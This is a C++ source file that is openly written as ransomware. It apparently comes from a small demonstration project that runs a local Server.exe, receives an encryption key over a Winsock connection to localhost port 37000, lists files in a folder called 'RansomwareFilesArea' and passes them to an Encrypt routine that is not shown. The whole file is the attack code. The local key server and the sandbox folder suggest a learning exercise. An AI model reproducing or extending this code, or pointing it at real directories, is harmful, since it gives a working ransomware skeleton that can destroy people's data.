#pragma comment(lib,"ws2_32.lib")
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <WinSock2.h>
#include <iostream>
#include <vector>
#include "Encryption.h"
#include <thread>

char key[256];

void GetKeysFromServer()
{
	//Winsock Startup
	WSAData wsaData;
	WORD DllVersion = MAKEWORD(2, 1);
	if (WSAStartup(DllVersion, &wsaData) != 0) //If WSAStartup returns anything other than 0, then that means an error has occured in the WinSock Startup.
	{
		MessageBoxA(NULL, "Winsock startup failed", "Error", MB_OK | MB_ICONERROR);
		exit(1);
	}

	SOCKADDR_IN addr; //Address to be binded to our Connection socket
	int sizeofaddr = sizeof(addr); //Need sizeofaddr for the connect function
	addr.sin_addr.s_addr = inet_addr("127.0.0.1"); //Address = localhost (this pc)
	addr.sin_port = htons(37000); //Port = 37000
	addr.sin_family = AF_INET; //IPv4 Socket

	SOCKET Connection = socket(AF_INET, SOCK_STREAM, NULL); //Set Connection socket
	if (connect(Connection, (SOCKADDR*)&addr, sizeofaddr) != 0) //If we are unable to connect...
	{
		MessageBoxA(NULL, "Failed to Connect", "Error", MB_OK | MB_ICONERROR);
		return; //Failed to Connnameect
	}
	recv(Connection, key, sizeof(key), NULL); //Receive key into array
}

std::vector<std::string> SearchFiles()
{
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;
	std::vector<std::string> fileNames;

	hFind = FindFirstFile("RansomwareFilesArea\\*.*", &FindFileData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		printf("FindFirstFile failed (%d)\n", GetLastError());
		return fileNames;
	}
	else
	{
		do
		{
			fileNames.push_back(FindFileData.cFileName);
		} while (FindNextFile(hFind, &FindFileData));
		FindClose(hFind);
	}
	return fileNames;
}

void runServer()
{
	system("call Server.exe");
}

int main()
{
	// Start Server
	std::thread t (runServer);
	Sleep(100);

	// Get keys from server
	GetKeysFromServer();
	
	// Find local files to encrypt
	std::vector<std::string> fileNames = SearchFiles();
	
	// Encryption
	if (!fileNames.empty())
		Encrypt(fileNames, key);
	
	t.join();

	system("pause");
	return 1;
}